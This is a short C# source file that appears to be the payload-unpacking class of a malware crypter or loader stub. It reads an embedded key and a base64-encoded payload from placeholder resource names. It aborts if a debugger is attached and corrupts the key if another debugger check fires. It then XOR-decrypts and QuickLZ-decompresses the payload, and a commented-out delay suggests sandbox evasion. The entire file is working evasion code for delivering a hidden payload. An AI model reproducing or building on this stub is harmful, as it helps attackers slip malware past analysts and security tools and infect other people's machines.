using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace A
{
    public class ResourceGetter
    {
        private static string PayloadName = "[PAYLOAD_RESOURCE_NAME]";
        private static string PayloadKey = "[PAYLOAD_KEY_RESOURCE_NAME]";

        private static Assembly stubAssembly = Assembly.GetExecutingAssembly();

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll")]
        private extern static void Sleep(uint msec);

        public static byte[] GetPayload()
        {
            byte[] k = null;
            byte[] p = null;

            if (Debugger.IsAttached)
                return null;

            using (Stream stream = stubAssembly.GetManifestResourceStream(PayloadKey))
            {
                using (BinaryReader rdr = new BinaryReader(stream))
                    k = rdr.ReadBytes((int)stream.Length);
            }

            using (Stream stream = stubAssembly.GetManifestResourceStream(PayloadName))
            {
                using (StreamReader rdr = new StreamReader(stream))
                    p = Convert.FromBase64String(rdr.ReadToEnd());
            }

            if (IsDebuggerPresent())
            {
                k = new byte[k.Length];
                Random R = new Random();
                R.NextBytes(k);
            }

            // Sleep(1000 * 5);

            xor(p, k);

            p = QuickLZ.decompress(p);


            return p;
        }

        private static void xor(byte[] input, byte[] key)
        {
            for (int i = 0; i < input.Length; i++)
                input[i] ^= key[i % key.Length];
        }
    }
}
